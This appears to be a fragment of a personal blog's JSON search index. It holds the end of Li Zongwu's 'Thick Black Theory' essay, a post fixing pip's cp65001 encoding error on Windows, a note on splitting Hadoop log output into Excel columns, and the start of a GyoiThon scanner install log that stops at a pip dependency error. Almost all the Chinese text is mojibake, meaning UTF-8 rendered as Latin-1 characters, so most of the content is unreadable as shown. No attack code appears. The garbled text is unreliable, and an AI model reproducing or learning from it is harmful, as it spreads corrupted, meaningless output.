ï¼Œæ˜¯å½°å½°å¯è€ƒçš„ã€‚åœ®ä¸Šå—ä¹¦ä¸€äº‹ï¼Œè€äººç§ç§ä½œç”¨ï¼Œæ— éæ•™å¼ è‰¯è„¸çš®åšç½¢äº†ã€‚è¿™ä¸ªé“ç†ï¼Œè‹ä¸œå¡çš„ç•™å€™è®ºï¼Œè¯´å¾—å¾ˆæ˜ç™½ã€‚å¼ è‰¯æ˜¯æœ‰å¤™æ ¹çš„äººï¼Œä¸€ç»æŒ‡ç‚¹ï¼Œè¨€ä¸‹é¡¿æ‚Ÿï¼Œæ•…è€äººä»¥ç‹è€…å¸ˆæœŸä¹‹ã€‚è¿™ç§æ— ä¸Šå¦™æ³•ï¼Œæ–­éé’æ ¹çš„äººæ‰€èƒ½äº†è§£ï¼Œæ‰€ä»¥å²è®°ä¸Šè¯´ï¼šâ€œè‰¯ä¸ºä»–äººè¨€ï¼Œçš†ä¸çœï¼Œç‹¬æ²›å…¬å–„ä¹‹ï¼Œè‰¯æ›°ï¼Œæ²›å…¬æ®†å¤©æˆä¹Ÿã€‚â€å¯è§è¿™ç§å­¦é—®ï¼Œå…¨æ˜¯å…³ä¹èµ„è´¨ï¼Œæ˜å¸ˆå›ºç„¶éš¾å¾—ï¼Œå¥½å¾’å¼Ÿä¹Ÿä¸å®¹æ˜“å¯»æ‰¾ã€‚éŸ©ä¿¡æ±‚å°é½ç‹çš„æ—¶å€™ï¼Œåˆ˜é‚¦å‡ ä¹è¯¯ä¼šï¼Œå…¨é ä»–çš„ä¸šå¸ˆåœ¨æ—æŒ‡ç‚¹ï¼Œä»¿ä½›ç°åœ¨å­¦æ ¡ä¸­ï¼Œæ•™å¸ˆæ”¹æ­£å­¦ç”Ÿä¹ é¢˜ä¸€èˆ¬ã€‚ä»¥åˆ˜é‚¦çš„å¤©èµ„ï¼Œæœ‰æ—¶è¿˜æœ‰é”™è¯¯ï¼Œè¿™ç§å­¦é—®çš„ç²¾æ·±ï¼Œå°±æ­¤å¯ä»¥æƒ³è§äº†ã€‚ã€€ã€€åˆ˜é‚¦å¤©èµ„æ—¢é«˜ï¼Œå­¦å†åˆæ·±ï¼ŒæŠŠæµä¿—æ‰€ä¼ å›è‡£ã€çˆ¶å­ã€å…„å¼Ÿã€å¤«å¦‡ã€æœ‹å‹äº”ä¼¦ï¼Œä¸€ä¸€æ‰“ç ´ï¼ŒåˆæŠŠç¤¼ä¹‰å»‰è€»ï¼Œæ‰«é™¤å‡€å°½ï¼Œæ‰€ä»¥èƒ½å¤Ÿå¹³è¡ç¾¤é›„ï¼Œç»Ÿä¸€æµ·å†…ï¼Œä¸€ç›´ç»è¿‡äº†å››ç™¾å‡ åå¹´ï¼Œä»–é‚£åšé»‘çš„ä½™æ°”ï¼Œæ–¹æ‰æ¶ˆç­ï¼Œæ±‰å®¶çš„ç³»ç»Ÿï¼Œäºæ˜¯ä¹æ‰æ–­ç»äº†ã€‚ã€€ã€€æ¥šæ±‰çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªäººï¼Œè„¸çš®æœ€åšï¼Œå¿ƒä¸é»‘ï¼Œç»ˆå½’å¤±è´¥ï¼Œæ­¤äººä¸ºè°ï¼Ÿå°±æ˜¯äººäººçŸ¥é“çš„éŸ©ä¿¡ã€‚èƒ¯ä¸‹ä¹‹è¾±ï¼Œä»–èƒ½å¤Ÿå¿å—ï¼Œåšçš„ç¨‹åº¦ï¼Œä¸åœ¨åˆ˜é‚¦ä¹‹ä¸‹ã€‚æ— å¥ˆå¯¹äºé»‘å­—ï¼Œæ¬ äº†ç ”ç©¶ï¼›ä»–ä¸ºé½ç‹æ—¶ï¼Œæœèƒ½å¬è’¯é€šçš„è¯å½“ç„¶è´µä¸å¯è¨€ï¼Œä»–ååç³»å¿µè‘—åˆ˜é‚¦è§£è¡£æ¨é£Ÿçš„æ©æƒ ï¼Œå†’å†’æ˜§æ˜§åœ°è¯´ï¼šâ€è¡£äººä¹‹è¡£è€…ï¼Œæ€€äººä¹‹å¿§ï¼›é£Ÿäººä¹‹é£Ÿè€…ï¼Œæ­»äººä¹‹äº‹ã€‚â€åæ¥é•¿ä¹é’Ÿå®¤ï¼Œèº«é¦–å¼‚å¤„ï¼Œå¤·åŠä¹æ—ã€‚çœŸæ˜¯å’ç”±è‡ªå–ï¼Œä»–è®¥è¯®é¡¹ç¾½æ˜¯å¦‡äººä¹‹ä»ï¼Œå¯è§å¿ƒå­ä¸é»‘ï¼Œä½œäº‹è¿˜è¦å¤±è´¥çš„ï¼Œè¿™ä¸ªå¤§åŸåˆ™ï¼Œä»–æœ¬æ¥ä¹Ÿæ˜¯çŸ¥é“çš„ï¼Œä½†ä»–è‡ªå·±ä¹Ÿåœ¨è¿™é‡Œå¤±è´¥ï¼Œè¿™ä¹Ÿæ€ªéŸ©ä¿¡ä¸å¾—ã€‚ã€€ã€€åŒæ—¶åˆæœ‰ä¸€ä¸ªäººï¼Œå¿ƒæœ€é»‘ï¼Œè„¸çš®ä¸åšï¼Œä¹Ÿå½’å¤±è´¥ï¼Œæ­¤äººä¹Ÿæ˜¯äººäººçŸ¥é“çš„ï¼Œå§“èŒƒåå¢ã€‚åˆ˜é‚¦ç ´å’¸é˜³ï¼Œç³»å­å©´ï¼Œè¿˜å†›åä¸Šï¼Œç§‹æ¯«ä¸çŠ¯ï¼ŒèŒƒå¢åƒæ–¹ç™¾è®¡ï¼Œæ€»æƒ³æŠŠä»–ç½®ä¹‹æ­»åœ°ï¼Œå¿ƒå­ä¹‹é»‘ï¼Œä¹ŸåŒåˆ˜é‚¦ä»¿ä½›ï¼›æ— å¥ˆè„¸çš®ä¸åšï¼Œå—ä¸å¾—æ°”ï¼Œæ±‰ç”¨é™ˆå¹³è®¡ï¼Œé—´ç–æ¥šå›ç‹ï¼Œå¢å¤§æ€’æ±‚å»ï¼Œå½’æ¥è‡³å½­åŸï¼Œç–½åèƒŒæ­»ï¼Œå¤§å‡¡åšå¤§äº‹çš„äººï¼Œé‚£æœ‰åŠ¨è¾„ç”Ÿæ°”çš„é“ç†ï¼Ÿâ€œå¢ä¸å»ï¼Œé¡¹ç¾½ä¸äº¡â€ï¼Œä»–è‹¥èƒ½éšå¿ä¸€ä¸‹ï¼Œåˆ˜é‚¦çš„ç ´ç»½å¾ˆå¤šã€‚éšä¾¿éƒ½å¯ä»¥æ”»è¿›å»ã€‚ä»–å¿¿ç„¶æ±‚å»ï¼ŒæŠŠè‡ªå·±çš„è€å‘½ï¼ŒæŠŠé¡¹ç¾½çš„æ±Ÿå±±ï¼Œä¸€é½é€æ‰ï¼Œå› å°ä¸å¿ï¼Œåäº†å¤§äº‹ï¼Œè‹ä¸œå¡è¿˜ç§°ä»–ä¸ºäººæ°ï¼Œæœªå…è¿‡èª‰ï¼Ÿã€€ã€€æ®ä¸Šé¢çš„ç ”ç©¶ï¼Œåšé»‘å­¦è¿™ç§å­¦é—®ï¼Œæ³•å­å¾ˆç®€å•ï¼Œç”¨èµ·æ¥å´å¾ˆç¥å¦™ï¼Œå°ç”¨å°æ•ˆï¼Œå¤§ç”¨å¤§æ•ˆï¼Œåˆ˜é‚¦å¸é©¬æ‡¿æŠŠå®ƒå­¦å®Œäº†ï¼Œå°±ç»Ÿä¸€å¤©ä¸‹ï¼›æ›¹æ“åˆ˜å¤‡å„å¾—ä¸€åï¼Œä¹Ÿèƒ½ç§°å­¤é“å¯¡ï¼Œå‰²æ®äº‰é›„ï¼›éŸ©ä¿¡ã€èŒƒå¢ï¼Œä¹Ÿæ˜¯å„å¾—ä¸€åï¼Œä¸å¹¸ç”Ÿä¸é€¢æ—¶ï¼Œååä¸åšé»‘å…¼å…¨çš„åˆ˜é‚¦ï¼Œå¹¶ä¸–è€Œç”Ÿï¼Œä»¥è‡´åŒå½’å¤±è´¥ã€‚ä½†æ˜¯ä»–ä»¬åœ¨ç”Ÿçš„æ—¶å€™ï¼Œå‡­å…¶ä¸€å¾—ä¹‹é•¿ï¼Œåšå–ç‹å€™å°†ç›¸ï¼Œç‚«èµ«ä¸€æ—¶ï¼Œèº«æ­»ä¹‹åï¼Œå²ä¼ ä¸­ä¹Ÿå äº†ä¸€å¸­ä¹‹åœ°ï¼Œåäººè°ˆåˆ°ä»–ä»¬çš„äº‹è¿¹ï¼Œå¤§å®¶éƒ½æ´¥æ´¥ä¹é“ï¼Œå¯è§åšé»‘å­¦ç»ˆä¸è´Ÿäººã€‚ã€€ã€€ä¸Šå¤©ç”Ÿäººï¼Œç»™æˆ‘ä»¬ä¸€å¼ è„¸ï¼Œè€Œåšå³åœ¨å…¶ä¸­ï¼Œç»™æˆ‘ä»¬ä¸€é¢—å¿ƒï¼Œè€Œé»‘å³åœ¨å…¶ä¸­ã€‚ä»è¡¨é¢ä¸Šçœ‹å»ï¼Œå¹¿ä¸æ•°å¯¸ï¼Œå¤§ä¸ç›ˆæ¬ï¼Œå¥½è±¡äº†æ— å¥‡å¼‚ï¼Œä½†ï¼Œè‹¥ç²¾å¯†çš„è€ƒå¯Ÿï¼Œå°±çŸ¥é“å®ƒçš„åšæ˜¯æ— é™çš„ï¼Œå®ƒçš„é»‘æ˜¯æ— æ¯”çš„ï¼Œå‡¡äººä¸–çš„åŠŸåå¯Œè´µã€å®«å®¤å¦»å¦¾ã€è¡£æœè½¦é©¬ï¼Œæ— ä¸€ä¸ä»è¿™åŒºåŒºä¹‹åœ°å‡ºæ¥ï¼Œé€ ç‰©ç”Ÿäººçš„å¥‡å¦™ï¼ŒçœŸæ˜¯ä¸å¯æ€è®®ã€‚é’æ ¹ä¼—ç”Ÿï¼Œèº«æœ‰è‡³å®ï¼Œå¼ƒè€Œä¸ç”¨ï¼Œå¯è°“å¤©ä¸‹ä¹‹å¤§æ„šã€‚ã€€ã€€ã€€åšé»‘å­¦å…±åˆ†ä¸‰æ­¥åŠŸå¤«ï¼Œç¬¬ä¸€æ­¥æ˜¯â€œåšå¦‚åŸå¢™ï¼Œé»‘å¦‚ç…¤ç‚­â€ã€‚èµ·åˆçš„è„¸çš®ï¼Œå¥½è±¡ä¸€å¼ çº¸ï¼Œç”±åˆ†è€Œå¯¸ï¼Œç”±å°ºè€Œä¸ˆï¼Œå°±åšå¦‚åŸå¢™äº†ã€‚æœ€åˆå¿ƒçš„é¢œè‰²ï¼Œä½œä¹³ç™½çŠ¶ï¼Œç”±ä¹³è‰²è€Œç‚­è‰²ã€è€Œé’è“è‰²ï¼Œå†è¿›è€Œå°±é»‘å¦‚ç…¤ç‚­äº†ã€‚åˆ°äº†è¿™ä¸ªå¢ƒç•Œï¼Œåªèƒ½ç®—åˆæ­¥åŠŸå¤«ï¼›å› ä¸ºåŸå¢™è™½åšï¼Œè½°ä»¥å¤§ç‚®ï¼Œè¿˜æ˜¯æœ‰æ”»ç ´çš„å¯èƒ½ï¼›ç…¤ç‚­è™½é»‘ï¼Œä½†é¢œè‰²è®¨åŒï¼Œä¼—äººéƒ½ä¸æ„¿æŒ¨è¿‘å®ƒã€‚æ‰€ä»¥åªç®—æ˜¯åˆæ­¥çš„åŠŸå¤«ã€‚ã€€ã€€ç¬¬äºŒæ­¥æ˜¯â€œåšè€Œç¡¬ï¼Œé»‘è€Œäº®â€ã€‚æ·±äºåšå­¦çš„äººï¼Œä»»ä½ å¦‚ä½•æ”»æ‰“ï¼Œä»–ä¸€ç‚¹ä¸åŠ¨ï¼Œåˆ˜å¤‡å°±æ˜¯è¿™ç±»äººï¼Œè¿æ›¹æ“éƒ½æ‹¿ä»–æ²¡åŠæ³•ã€‚æ·±äºé»‘å­¦çš„äººï¼Œå¦‚é€€å…‰æ¼†æ‹›ç‰Œï¼Œè¶Šæ˜¯é»‘ï¼Œä¹°ä¸»è¶Šå¤šï¼Œæ›¹æ“å°±æ˜¯è¿™ç±»äººï¼Œä»–æ˜¯è‘—åçš„é»‘å¿ƒå­ï¼Œç„¶è€Œä¸­åŸåæµï¼Œå€¾å¿ƒå½’æœï¼ŒçœŸå¯è°“â€œå¿ƒå­æ¼†é»‘ï¼Œæ‹›ç‰Œé€äº®â€ï¼Œèƒ½å¤Ÿåˆ°ç¬¬äºŒæ­¥ï¼Œå›ºç„¶åŒç¬¬ä¸€æ­¥æœ‰å¤©æ¸Šä¹‹åˆ«ï¼Œä½†è¿˜éœ²äº†è¿¹è±¡ï¼Œæœ‰å½¢æœ‰è‰²ï¼Œæ‰€ä»¥æ›¹æ“çš„æœ¬äº‹ï¼Œæˆ‘ä»¬ä¸€çœ¼å°±çœ‹å‡ºæ¥äº†ã€‚ã€€ã€€ç¬¬ä¸‰æ­¥æ˜¯â€œåšè€Œæ— å½¢ï¼Œé»‘è€Œæ— è‰²â€ã€‚è‡³åšè‡³é»‘ï¼Œå¤©ä¸Šåä¸–ï¼Œçš†ä»¥ä¸ºä¸åšä¸é»‘ï¼Œè¿™ä¸ªå¢ƒç•Œï¼Œå¾ˆä¸å®¹æ˜“è¾¾åˆ°ï¼Œåªå¥½åœ¨å¤ä¹‹å¤§åœ£å¤§è´¤ä¸­å»å¯»æ±‚ã€‚æœ‰äººé—®ï¼šâ€œè¿™ç§å­¦é—®ï¼Œå“ªæœ‰è¿™æ ·ç²¾æ·±ï¼Ÿâ€æˆ‘è¯´ï¼šâ€œå„’å®¶çš„ä¸­åº¸ï¼Œè¦è®²åˆ°â€˜æ— å£°æ— è‡­â€™æ–¹èƒ½ç»ˆæ­¢ï¼›å­¦ä½›çš„äººï¼Œè¦è®²åˆ°â€˜è©ææ— æ ‘ï¼Œæ˜é•œéå°â€™ï¼Œæ‰ç®—æ­£æœï¼›ä½•å†µåšé»‘å­¦æ˜¯åƒå¤ä¸ä¼ ä¹‹ç§˜ï¼Œå½“ç„¶è¦åšåˆ°â€˜æ— å½¢æ— è‰²â€™ï¼Œæ‰ç®—æ­¢å¢ƒâ€ã€‚ã€€ã€€æ€»ä¹‹ï¼Œç”±ä¸‰ä»£ä»¥è‡³äºä»Šï¼Œç‹å€™å°†ç›¸ï¼Œè±ªæ°åœ£è´¤ï¼Œä¸å¯èƒœæ•°ï¼Œè‹Ÿå…¶äº‹ä¹‹æœ‰æˆï¼Œæ— ä¸€ä¸å‡ºäºæ­¤ï¼›ä¹¦å†Œä¿±åœ¨ï¼Œäº‹å®éš¾è¯¬ï¼Œè¯»è€…å€˜èƒ½æœ¬æˆ‘æŒ‡ç¤ºçš„é€”å¾„ï¼Œè‡ªå»æœå¯»ï¼Œè‡ªç„¶å·¦å³é€¢æºï¼Œå¤´å¤´æ˜¯é“ã€‚[ä½œè€…ç®€ä»‹]:æå®—å¾ï¼Œ1879å¹´ï¼ˆæ¸…å…‰ç»ªäº”å¹´ï¼‰ç”Ÿäºæˆéƒ½ï¼Œä¸€åº¦ä»»å›½æ°‘å…šæ”¿åºœå®˜å‘˜ã€å››å·å¤§å­¦æ•™æˆï¼Œåæˆä¸ºè‡ªç”±æ’°ç¨¿äººï¼Œäº1944å¹´å»ä¸–ã€‚å¥‡ä¹¦ã€Šåšé»‘å­¦ã€‹æˆç¨¿äº1917å¹´ã€‚æ›¾è¿è½½äºæˆéƒ½ã€Šå…¬è®ºæ—¥æŠ¥ã€‹ï¼Œåç”±æ•…æœªèƒ½è½½å®Œã€‚å‡ ç»å‘¨æŠ˜ï¼Œåœ¨1934å¹´æ­£å¼å‡ºç‰ˆã€‚"
  },

  {
    "title"    : "ã€ŒTerminalã€:pipæŠ¥é”™&#39;unkown-encoding&#39;",
    "category" : "",
    "tags"     : "python, Terminal",
    "url"      : "/blog/2020/pip/said/unkown/encoding/",
    "date"     : "Apr 1, 2020",
    "content"  : "å¯æ€–çš„unkownencoding.è‡ªä»ä¿®æ”¹äº†windowsç»ˆç«¯çš„ç¼–ç æ ¼å¼åï¼Œå°±å‡ºäº†å„ç§é—®é¢˜ï¼Œå‡ ä¹åœ¨ç»ˆç«¯ä¸Šæ‰§è¡Œçš„è½¯ä»¶éƒ½è¿è¡Œä¸äº†ï¼Œæç¤ºLookupError:unknownencoding:cp65001ï¼Œå¦‚ä¸‹æŠ¥é”™ã€‚C:\\Users\\æœ¬é˜¿ä¿¡&gt;pip--versionTraceback(mostrecentcalllast):File\"c:\\python27\\lib\\runpy.py\",line174,in_run_module_as_main\"__main__\",fname,loader,pkg_name)File\"c:\\python27\\lib\\runpy.py\",line72,in_run_codeexeccodeinrun_globalsFile\"C:\\Python27\\Scripts\\pip.exe\\__main__.py\",line4,in&lt;module&gt;File\"c:\\python27\\lib\\site-packages\\pip\\_internal\\cli\\main.py\",line10,in&lt;module&gt;frompip._internal.cli.autocompletionimportautocompleteFile\"c:\\python27\\lib\\site-packages\\pip\\_internal\\cli\\autocompletion.py\",line9,in&lt;module&gt;frompip._internal.cli.main_parserimportcreate_main_parserFile\"c:\\python27\\lib\\site-packages\\pip\\_internal\\cli\\main_parser.py\",line7,in&lt;module&gt;frompip._internal.cliimportcmdoptionsFile\"c:\\python27\\lib\\site-packages\\pip\\_internal\\cli\\cmdoptions.py\",line31,in&lt;module&gt;frompip._internal.utils.uiimportBAR_TYPESFile\"c:\\python27\\lib\\site-packages\\pip\\_internal\\utils\\ui.py\",line64,in&lt;module&gt;_BaseBar=_select_progress_class(IncrementalBar,Bar)#type:AnyFile\"c:\\python27\\lib\\site-packages\\pip\\_internal\\utils\\ui.py\",line57,in_select_progress_classsix.text_type().join(characters).encode(encoding)LookupError:unknownencoding:cp65001åªèƒ½æ€ªè‡ªå·±ï¼Œå¥½å¥½çš„æ”¹ä»€ä¹ˆtxtæ–‡æœ¬ç¼–ç ï¼Œç°åœ¨å¥½äº†ã€‚è§£é“ƒè¿˜é¡»ç³»é“ƒäººï¼šæš‚æ—¶åœ¨è¯¥ç»ˆç«¯ä¸‹å¯ä»¥ä½¿ç”¨pipC:\\Users\\æœ¬é˜¿ä¿¡&gt;setPYTHONIOENCODING=UTF-8C:\\Users\\æœ¬é˜¿ä¿¡&gt;pip--versionpip20.0.2fromc:\\python27\\lib\\site-packages\\pip(python2.7)é“¾æ¥è¿˜å»ºè®®è®¾ç½®å…¨å±€å˜é‡ä¸º$env:PYTHONIOENCODING=\"UTF-8\"ï¼Œä½†æ˜¯æˆ‘æœç´¢äº†ä¸€ä¸‹ï¼Œæ²¡æœ‰æ‰¾åˆ°æ–¹æ³•ï¼Œå¸Œæœ›ä¼šçš„æœ‹å‹é‚®ä»¶æˆ‘æ•™æˆ‘ã€‚CHCP936UTF-8æ˜¯unicodeç¼–ç çš„ä¸€ç§è½åœ°æ–¹æ¡ˆï¼šUnicodeç¬¦å·èŒƒå›´(åå…­è¿›åˆ¶)UTF-8ç¼–ç æ–¹å¼ï¼ˆäºŒè¿›åˆ¶ï¼‰00000000-0000007F0xxxxxxx00000080-000007FF110xxxxx10xxxxxx00000800-0000FFFF1110xxxx10xxxxxx10xxxxxx00010000-0010FFFF11110xxx10xxxxxx10xxxxxx10xxxxxx\\xå¯¹åº”çš„æ˜¯UTF-8ç¼–ç çš„æ•°æ®ï¼Œé€šè¿‡è½¬åŒ–è§„åˆ™å¯ä»¥è½¬æ¢ä¸ºUnicodeç¼–ç ï¼Œå°±èƒ½å¾—åˆ°å¯¹åº”çš„æ±‰å­—ï¼Œè½¬æ¢è§„åˆ™å¾ˆç®€å•ï¼Œå…ˆå°†\\xå»æ‰ï¼Œè½¬æ¢ä¸ºæ•°å­—ï¼Œç„¶åè¿›è¡Œå¯¹åº”çš„ä½ç§»æ“ä½œå³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å…ˆè¦åˆ¤æ–­utf-8çš„ä½æ•°."
  },

  {
    "title"    : "ã€Œæœºå™¨å­¦ä¹ ã€ï¼šè°ˆè°ˆæœ‰å…³æ•°æ®é¢„å¤„ç†ä¸­çš„å°æŠ€å·§-Excelåˆ†åˆ—",
    "category" : "",
    "tags"     : "ç¬”è®°, æœºå™¨å­¦ä¹ , Excel",
    "url"      : "/top/2020/how-to-preview-datas/",
    "date"     : "Feb 24, 2020",
    "content"  : "é—®é¢˜å¼•å‡ºhadoop,hiveç­‰è¾“å‡ºæ•°æ®å¯¼å‡ºä¸ºcsvæ–‡ä»¶è§£å†³ï¼šç”¨è¡¨æ ¼è½¯ä»¶æ‰“å¼€çš„æ•°æ®æ–‡ä»¶ï¼Œæ•°æ®éƒ½ä¿å­˜åœ¨åŒä¸€åˆ—ï¼›é€šè¿‡ä¸€äº›å°æŠ€å·§æŠŠä¸€åˆ—çš„æ•°æ®åˆ†æˆæˆ‘ä»¬æ‰€éœ€è¦çš„åˆ—æ•°ã€‚å†™è®ºæ–‡çš„æ—¶å€™é‡åˆ°çš„é—®é¢˜ï¼šhadoop1.0.3ä½¿ç”¨hadoopå¯¹æ•°æ®è¿›è¡Œmap-reduceæ“ä½œåï¼Œåœ¨ç»ˆç«¯ä¸Šå‘ˆç°çš„å½¢å¼ï¼š192.168.1.23124\t1127.0.0.12621\t1192.168.1.23127\t2192.168.1.23125\t1192.168.1.24411\t1192.168.1.100428\t1127.0.0.12755\t1127.0.0.12625\t2192.168.1.22126\t2192.168.1.1004087\t2è¿™é‡Œçš„æ“ä½œä»…ä»…æ˜¯å¯¹æ—¥å¿—çš„é•¿åº¦è¿›è¡Œäº†è°ƒæ•´ï¼Œæœ€ç»ˆç›®çš„æ˜¯å¯¹æ—¥å¿—è¿›è¡Œèšç±»ï¼Œæ‰€ä»¥å¯¹æ•°æ®æ•´åˆç‰¹å¾ï¼Œæ•´ç†å‡ºå‡ ä¸ªç‰¹å¾åŒ…æ‹¬ï¼šipï¼Œurlé•¿åº¦ï¼Œparameteré•¿åº¦å’Œvisittimesperhoursè¿™å››ä¸ªç‰¹å¾ï¼›åœ¨å®é™…çš„æ“ä½œä¸­ï¼Œæ˜¯ä¸å¯èƒ½æŠŠhadoopçš„è¾“å‡ºæ‰“å°åœ¨ç»ˆç«¯ä¸Šç„¶åctrl+c,ctrl+vï¼Œè¿™æ ·çš„å·¥ä½œé‡å¾ˆå¤§ã€‚è€Œæˆ‘ä»¬å¯è·å¾—çš„æ˜¯ï¼š1.å½“ç„¶hadoopä¹Ÿç»™å‡ºäº†è§£å†³æ–¹æ¡ˆå°±æ˜¯é€šè¿‡webäº¤äº’é¡µé¢è®¿é—®æ–‡ä»¶ï¼Œå¹¶æœ‰ä¸‹è½½æ–‡ä»¶çš„æŒ‰é’®ã€‚2.hadoopfs-getå‘½ä»¤åŒæ ·ä¹Ÿå¯ä»¥æŠŠè¾“å‡ºæ–‡ä»¶ä»hdfsæ–‡ä»¶ç³»ç»Ÿä¸‹è½½åˆ°æœ¬åœ°ã€‚ä½†æ˜¯ä½¿ç”¨è¡¨æ ¼è½¯ä»¶æ‰“å¼€ï¼Œæ‰€æœ‰çš„æ•°æ®ä»ç„¶æ˜¯å¤„åœ¨åŒä¸€åˆ—ä¸‹ï¼Œä¸”æ— æ³•åˆ†åˆ—ã€‚æ‰€ä»¥å¯¼è‡´å¹¶ä¸èƒ½ç»§ç»­åé¢çš„pythonè¯»å–csvçš„æ“ä½œï¼Œä¼šæŠ¥é”™ï¼›è§£å†³æ–¹æ³•ï¼šé¦–å…ˆéœ€è¦ï¼šæ•°æ®åˆ†åˆ—æ“ä½œï¼šç½‘ä¸Šæœ‰å¤§æŠŠçš„æ•™ç¨‹æç¤ºæˆ‘ä»¬å¦‚ä½•å»æŠŠä¸€å †æ•°æ®ä»ä¸€åˆ—ä¸­åˆ†ç¦»æˆæ•°åˆ—ã€‚wpså’ŒexcelåŸç†åŸºæœ¬éƒ½ä¸å˜ï¼šé€‰ä¸­æ•°æ®åˆ—ï¼Œç‚¹é€‰æ•°æ®-åˆ†åˆ—åˆ™å¯è¿›å…¥åˆ†åˆ—æ“ä½œï¼Œåˆ†åˆ—æ“ä½œéœ€è¦æˆ‘ä»¬å»å‘Šè¯‰æœºå™¨ï¼Œå“ªäº›æ˜¯æ•°æ®éœ€è¦åˆ†å‡ºæ¥å•ç‹¬æˆä¸€åˆ—ï¼Œæ‰€ä»¥ä»¥ä¸‹å°±æ˜¯é‡ç‚¹ï¼šåˆ†éš”ç¬¦ï¼›å…¶æ¬¡ï¼šä¼˜åŒ–ä»£ç çš„è¾“å‡ºï¼šæˆ‘ä»¬éœ€è¦å¯¹ä»£ç è¿›è¡Œä¿®æ”¹ï¼Œå³ä¿è¯ï¼šæˆ‘ä»¬æ‰€éœ€è¦çš„æ¯åˆ—è¾“å‡ºçš„å­—æ®µå’Œåé¢çš„å­—æ®µä¸­é—´éƒ½å­˜åœ¨åˆ†éš”ç¬¦ï¼Œåˆ†éš”ç¬¦å¯ä»¥æ˜¯tabï¼Œç©ºæ ¼ç­‰ç­‰ï¼›mapprintåˆå§‹ä»£ç printip,format(len(url)),format(len(para))ä¿®æ”¹åä»£ç ï¼Œå¦‚ä¸‹ï¼Œåœ¨ç¬¬äºŒåˆ—å’Œç¬¬ä¸‰åˆ—è¾“å‡ºä¹‹é—´åŠ å…¥äº†ä¸¤ä¸ªç©ºæ ¼ï¼Œå‘Šè¯‰pythonprint('')printip,format(len(url)),(''),format(len(para))äºæ˜¯åœ¨æŠŠè¾“å‡ºæ–‡ä»¶å¯¼å‡ºåï¼Œä½¿ç”¨è¡¨æ ¼è½¯ä»¶æ‰“å¼€æ–‡ä»¶åŒæ ·æ˜¯æ‰€æœ‰çš„æ•°æ®å­˜åœ¨åŒä¸€åˆ—çš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯¹æ•°æ®åˆ—è¿›è¡Œæ•°æ®åˆ†åˆ—æ“ä½œåå³å¯åˆ†å‡ºæˆ‘ä»¬æ‰€éœ€è¦çš„åˆ—æ•°ï¼Œæˆ‘è¿™ä¸ªæ˜¯å››åˆ—ã€‚å¦‚ä¸‹ï¼Œæˆ‘ä»¬åœ¨ç»ˆç«¯ä¸‹catä¸€ä¸‹ï¼šip,url,para,time127.0.0.1,24,10,303127.0.0.1,14,11,1192.168.1.2,39,32,1192.168.1.2,29,11,2127.0.0.1,40,10,2127.0.0.1,333,20,1127.0.0.1,23,51,2192.168.1.2,5,18,1ï¼ˆè¡¨å¤´è‡ªå·±åŠ å³å¯ï¼‰æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ•°æ®æ˜¾ç¤ºï¼Œæ¯åˆ—çš„æ•°æ®ä¸­é—´éƒ½æœ‰ä¸€ä¸ªé€—å·ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬åœ¨è¾“å‡ºçš„æ—¶å€™ï¼Œä¹Ÿå¯ä»¥å¯¹æ•°æ®è¿›è¡Œå¤„ç†ï¼Œæ¯ä¸€åˆ—æ•°æ®éƒ½åŠ ä¸Šé€—å·ï¼Œç†è®ºä¸Šæ˜¯å¯è¡Œçš„ï¼Œæˆ‘æ²¡æœ‰è¯•è¿‡ã€‚é¼“åŠ±å„ä½å¤šåŠ¨æ‰‹ã€‚ä»¥ä¸Šã€‚"
  },

  {
    "title"    : "ã€Œèµ„äº§æ‰«æã€:Let&#39;s GyoiThon !",
    "category" : "",
    "tags"     : "ç¬”è®°, å®‰å…¨å·¥å…·, Web",
    "url"      : "/blog/2020/Lets/GyoiThon/",
    "date"     : "Jan 21, 2020",
    "content"  : "title:GyoiThonScanner1ä¸‹è½½ä¾èµ–é¡¹ä¸‹è½½æºæ–‡ä»¶åï¼Œè¿›å…¥æ–‡ä»¶å¤¹è·¯å¾„ï¼Œæ ¹æ®pythonçš„ä¾èµ–è¿›è¡Œå®‰è£…ï¼Œå³requirements.txtæ–‡ä»¶ï¼šPSG:\\GyoiThon&gt;pipinstall-rrequirements.txtDEPRECATION:Python2.7willreachtheendofitslifeonJanuary1st,2020.PleaseupgradeyourPythonasPython2.7won'tbemaintainedafterthatdate.AfutureversionofpipwilldropsupportforPython2.7.MoredetailsaboutPython2supportinpip,canbefoundathttps://pip.pypa.io/en/latest/development/release-process/#python-2-supportCollectingbeautifulsoup4&gt;=4.6.3Usingcachedhttps://files.pythonhosted.org/packages/c5/48/c88b0b390ae1f785942fc83413feb1268a1eb696f343d4d55db735b9bb39/beautifulsoup4-4.8.2-py2-none-any.whlRequirementalreadysatisfied:cchardet&gt;=2.1.4inc:\\python27\\lib\\site-packages(from-rrequirements.txt(line2))(2.1.5)Collectingcensys&gt;=0.0.8Usingcachedhttps://files.pythonhosted.org/packages/88/4b/3ca07679928c26bb5503b53c37e2f6eef2521289956e2c1bf74b64008afa/censys-0.0.8.tar.gzRequirementalreadysatisfied:docopt&gt;=0.6.2inc:\\python27\\lib\\site-packages(from-rrequirements.txt(line4))(0.6.2)Collectinggoogle-api-python-client&gt;=1.7.4Usingcachedhttps://files.pythonhosted.org/packages/31/c7/16ca16d28f2d71c8bd6fa67c91eb2a82259dc589c0504f903b675ecdaa84/google_api_python_client-1.7.11-py2-none-any.whlCollectingJinja2&gt;=2.10.1Usingcachedhttps://files.pythonhosted.org/packages/65/e0/eb35e762802015cab1ccee04e8a277b03f1d8e53da3ec3106882ec42558b/Jinja2-2.10.3-py2.py3-none-any.whlERROR:Couldnotfindaversionthatsatisfiestherequirementmatplotlib&gt;=3.0.3(from-rrequirements.txt(line7))(fromversions:0.86,0.86.1,0.86.2,0.91.0,0.91.1,1.0.1,1.1.0,1.1.1,1.2.0,1.2.1,1.3.0,1.3.1,1.4.0,1.4.1rc1,1.4.1,1.4.2,1.4.3,1.5.0,1.5.1,1.5.2,1.5.3,2.0.0b1,2.0.0b2,2.0.0b3,2.0.0b4,2.0.0rc1,2.0.0rc2,2.0.0,2.0.1,2.0.2,2.1.0rc1,2.1.0,2.1.1,2.1.2,2.2.0rc1,2.2.0,2.2.2,2.2.3,2.2.4)ERROR:Nomatchingdistributionfoundformatplotlib&gt;=3